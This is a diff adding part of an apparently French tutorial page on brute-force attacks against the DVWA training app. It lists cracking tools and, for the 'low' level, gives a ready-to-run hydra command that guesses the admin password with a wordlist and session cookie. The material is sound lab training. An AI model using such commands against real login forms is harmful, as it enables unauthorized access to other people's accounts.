+<td>Hachages de mots de passe</td>
+<td><a href="https://www.openwall.com/john/">Site officiel</a></td>
+</tr>
+<tr>
+<td><strong>Hashcat</strong></td>
+<td>Outil de déchiffrement avancé pour hachages, avec support GPU.</td>
+<td>Hachages de mots de passe</td>
+<td><a href="https://github.com/hashcat/hashcat">GitHub</a></td>
+</tr>
+<tr>
+<td><strong>Burp Suite</strong></td>
+<td>Suite d'outils pour les tests de sécurité, incluant un module de bruteforce.</td>
+<td>Formulaires web, sessions HTTP</td>
+<td><a href="https://portswigger.net/burp">Site officiel</a></td>
+</tr>
+<tr>
+<td><strong>Wfuzz</strong></td>
+<td>Outil flexible pour le bruteforce des paramètres web.</td>
+<td>URL, cookies, paramètres web</td>
+<td><a href="https://github.com/xmendez/wfuzz">GitHub</a></td>
+</tr>
+<tr>
+<td><strong>Patator</strong></td>
+<td>Outil modulaire pour tester les mots de passe et autres services.</td>
+<td>SSH, HTTP, DNS, MySQL, etc.</td>
+<td><a href="https://github.com/lanjelot/patator">GitHub</a></td>
+</tr>
+<tr>
+<td><strong>Ncrack</strong></td>
+<td>Outil rapide pour tester la sécurité des authentifications réseau.</td>
+<td>SSH, RDP, FTP, Telnet, etc.</td>
+<td><a href="https://github.com/nmap/ncrack">GitHub</a></td>
+</tr>
+<tr>
+<td><strong>Aircrack-ng</strong></td>
+<td>Outil pour le craquage des clés de réseaux Wi-Fi.</td>
+<td>Clés WEP/WPA sur Wi-Fi</td>
+<td><a href="https://www.aircrack-ng.org/">Site officiel</a></td>
+</tr>
+<tr>
+<td><strong>CeWL</strong></td>
+<td>Génère des listes de mots (wordlists) basées sur les contenus d'un site.</td>
+<td>Création de dictionnaires personnalisés</td>
+<td><a href="https://github.com/digininja/CeWL">GitHub</a></td>
+</tr>
+</tbody>
+</table>
+<h2 id="41-premier-niveau---low">4.1 Premier niveau - low </h2>
+<p>On arrive sur une simple page de login<br>
+<img src="images\bruteforce\1.png" alt="images"></p>
+<p>On remarque en essayant des identifiants que ces derniers sont envoyés via la méthode <code>GET</code> car on a cette url.</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>http://dvwa.lan/DVWA/vulnerabilities/brute/?username=admin&amp;password=admin&amp;Login=Login#
+</code></pre><p>On va utiliser <code>hydra</code> pour essayer de bruteforce.<br>
+La commande n'etant pas très lisible en screenshot, la voici directement :</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>hydra -l admin -P /opt/wordlists/wordlists/passwords/most_used_passwords.txt dvwa.lan http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=po9is02drb8ohe96pq1j61flmu"
+</code></pre>
+      </div>
+      
+      
+    
+    
+    
+    
+    
+    
+  
+    </body></html>
